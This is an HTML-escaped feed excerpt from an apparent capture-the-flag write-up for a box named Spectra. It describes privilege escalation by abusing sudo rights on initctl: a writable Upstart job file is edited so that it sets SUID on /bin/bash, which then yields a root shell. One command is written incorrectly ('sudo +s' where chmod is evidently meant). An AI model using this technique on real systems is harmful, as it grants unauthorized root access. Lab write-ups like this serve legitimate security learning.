&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -l
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This will list all the binaries Katie can run with sudo:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/24.png&#34; alt=&#34;Pasted image 20210624174625.png&#34;&gt;
We see that we can run &lt;strong&gt;initctl&lt;/strong&gt; as root. As stated on it&amp;rsquo;s man page, initctl allows a system administrator to communicate and interact with the &lt;strong&gt;Upstart&lt;/strong&gt;. Upstart handles the starting of the tasks and services during boot and stopping them during shutdown. By interacting with the Upstart, we can make initctl start or stop jobs. The way initctl understands what jobs it can work with is by reading the configuration files of them, found on the /etc/init folder. So if we manage to make our own job, we can start it and it will run as the root user since we have sudo rights. So we have 2 options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Create a new job by writing a new configuration file (.conf).&lt;/li&gt;
&lt;li&gt;Edit an already existing one.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first option is not possible since we do not have permission to write on the /etc folder. That leaves us with the second option. By searching through the /etc/init folder we see that we can&amp;rsquo;t edit all files, however we have the rights to edit some of the files in there. Great!
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/25.png&#34; alt=&#34;Pasted image 20210624180211.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Below we can see what a job configuration file looks like:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/26.png&#34; alt=&#34;Pasted image 20210624180517.png&#34;&gt;
Notice the part between &amp;ldquo;&lt;strong&gt;script&lt;/strong&gt;&amp;rdquo; and &amp;ldquo;&lt;strong&gt;end script&lt;/strong&gt;&amp;rdquo;. That part contains the commands that are gonna run when the job starts. What we want to do is replace these commands with our own. There are some choices here, so let&amp;rsquo;s try making the job set the SUID permission on /bin/bash. This will let us run bin/bash with root privileges. In this example, i edit the &lt;code&gt;test.conf&lt;/code&gt; file with &lt;code&gt;nano&lt;/code&gt;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/28.png&#34; alt=&#34;Pasted image 20210624182236.png&#34;&gt;
Once we edit the job configuration file we need to start it with initctl (with sudo). After we start it, the job will execute &lt;code&gt;sudo +s /bin/bash&lt;/code&gt; as the root user.  We can confirm it worked by executing &lt;code&gt;/bin/bash&lt;/code&gt; with the &lt;code&gt;-p&lt;/code&gt; flag. The &lt;code&gt;-p&lt;/code&gt; flag is required in order for this to work since it is used to turn on privileged mode, making the bash shell run with the SUID privileges we set with the job:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/29.png&#34; alt=&#34;Pasted image 20210624182515.png&#34;&gt;
We are root!&lt;/p&gt;
&lt;h1 id=&#34;resources&#34;&gt;Resources&lt;/h1&gt;
&lt;p&gt;A good place to learn about &lt;strong&gt;Upstart&lt;/strong&gt; and &lt;strong&gt;initctl&lt;/strong&gt;:
&lt;a href=&#34;https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it&#34;&gt;https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it&lt;/a&gt;&lt;/p&gt;
</content>
            
            
            
                
                
                
                    
                    
                    
                        
                            <category scheme="https://netuserdoomdesire.github.io/posts/writeups/" term="posts\Writeups\" label="posts\Writeups\" />
                        
                    
                
            
            
            
                
                    
                
                    
                
            
        </entry>
    
</feed>
